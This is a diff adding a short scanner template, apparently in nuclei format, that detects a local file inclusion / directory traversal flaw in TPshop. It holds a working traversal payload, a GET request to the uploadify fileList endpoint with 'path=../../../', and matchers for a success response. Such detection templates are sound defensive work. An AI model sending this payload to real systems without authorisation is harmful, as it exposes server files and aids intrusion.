@@ -1,0 +1,21 @@
+id: tpshop-directory-traversal
+name: TPshop - Local File Inclusion
+severity: high
+confidence: tentative
+description: TPshop is vulnerable to local file inclusion.
+reference: CWE-22
+tags:
+- tpshop
+- lfi
+- vuln
+requests:
+- method: GET
+  path: /index.php/Home/uploadify/fileList?type=.+&path=../../../
+  matchers:
+  - type: body
+    words:
+    - '"state":"SUCCESS"'
+  - type: status
+    status:
+    - 200
+  condition: and
